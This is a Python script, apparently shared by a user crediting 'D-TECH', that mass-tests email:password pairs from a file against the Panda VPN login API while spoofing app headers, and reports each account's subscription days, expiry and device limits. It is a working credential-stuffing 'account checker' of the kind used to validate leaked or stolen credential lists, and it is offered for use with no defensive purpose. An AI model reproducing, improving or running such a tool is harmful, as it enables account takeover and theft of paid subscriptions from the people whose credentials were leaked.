import requests
import json
import time

# D-TECH Banner
print("\033[92m" + """
==========================================
      🐼 Panda VPN Account Checker 🐼    
         Made by D-TECH | @PREASX24        
==========================================
""" + "\033[0m")

# Function to check account from email and password
def check_account(email, password):
    # Generate Random Device Token (Optional)
    import uuid
    device_token = str(uuid.uuid4())

    # API URL and Headers
    url = "https://api.iajee.com/api/v2/users/app/login"
    headers = {
        "Host": "api.iajee.com",
        "User-Agent": "D-TECH Panda VPN Checker",
        "api-version": "v2.0",
        "Accept-Language": "en-US",
        "app-version-num": "66",
        "product-identifier": "Panda",
        "X-Timestamp": "1686274869",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json"
    }

    # Payload for the Request
    payload = {
        "account": email,
        "clientVersion": "6.3.0",
        "deviceName": "WIN-HPLUP5LK692-winnt-10.0.19041",
        "deviceToken": device_token,
        "deviceType": "WINDOWS",
        "password": password
    }

    # Send the Request
    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        response_data = response.json()

        if response.status_code == 200 and "accessToken" in response_data:
            print(f"\n✅ \033[92mLogin Successful!\033[0m")
            print(f"Account Created: {response_data.get('registerAt', 'N/A')}")
            print(f"Max Devices: {response_data.get('maxDeviceCount', 'N/A')}")
            print(f"Left Days: {response_data.get('leftDays', 'N/A')}")
            print(f"Expiration Date: {response_data.get('dueTime', 'N/A')}")
            print(f"Points: {response_data.get('rewardPoints', 'N/A')}")
        else:
            error_code = response_data.get("code", "Unknown")
            error_message = response_data.get("message", "Login failed.")
            print(f"\n❌ \033[91mLogin Failed:\033[0m {error_message} (Code: {error_code})")

    except requests.exceptions.RequestException as e:
        print(f"\n❌ \033[91mError:\033[0m {e}")

# Read accounts from 'accounts.txt' and check each one
def read_and_check_accounts():
    try:
        with open('accounts.txt', 'r') as file:
            accounts = file.readlines()
            for account in accounts:
                account = account.strip()
                if ":" not in account:
                    print(f"\n❌ \033[91mInvalid Format:\033[0m Account '{account}' is not in 'email:password' format.")
                    continue
                email, password = account.split(":")  # Split email and password
                print(f"\nChecking account: {email}")
                check_account(email, password)
                time.sleep(1)  # Optional: Sleep between checks to avoid hitting API too quickly
    except FileNotFoundError:
        print("\n❌ \033[91mError:\033[0m accounts.txt file not found!")
    except Exception as e:
        print(f"\n❌ \033[91mError:\033[0m {e}")

# Start the account checking process
read_and_check_accounts()

# Pause before Exit
input("\nPress Enter to exit...")
